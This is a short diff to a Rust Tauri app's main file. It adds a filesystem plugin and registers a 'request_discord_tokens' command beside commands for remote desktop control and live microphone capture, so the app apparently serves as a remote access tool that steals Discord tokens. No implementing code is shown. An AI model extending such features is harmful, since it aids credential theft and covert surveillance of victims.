@@ -12,6 +12,7 @@ use handlers::{tauri::*, SharedTauriState, TauriState};
 #[tokio::main(worker_threads = 3)]
 async fn main() {
     tauri::Builder::default()
+        .plugin(tauri_plugin_fs::init())
         .plugin(tauri_plugin_dialog::init())
         .plugin(tauri_plugin_shell::init())
         .manage(SharedTauriState(Arc::new(
@@ -30,6 +31,7 @@ async fn main() {
             start_remote_desktop,
             stop_remote_desktop,
             request_mic_devices,
+            request_discord_tokens,
             start_mic_live,
             stop_mic_live,
             start_mic_recording,
